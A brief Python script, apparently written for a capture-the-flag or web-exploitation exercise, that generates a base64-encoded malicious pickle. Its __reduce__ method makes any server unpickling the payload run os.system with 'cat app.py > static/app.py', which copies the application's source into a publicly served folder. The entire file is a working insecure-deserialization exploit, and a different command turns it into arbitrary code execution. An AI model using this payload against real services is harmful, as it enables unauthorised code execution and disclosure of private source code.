import os
import pickle
import base64
import codecs

CMD = 'cat app.py > static/app.py'

class RunCmd(object):
    def __reduce__(self):
        return(os.system, (CMD,))

print(base64.b64encode(pickle.dumps(RunCmd())))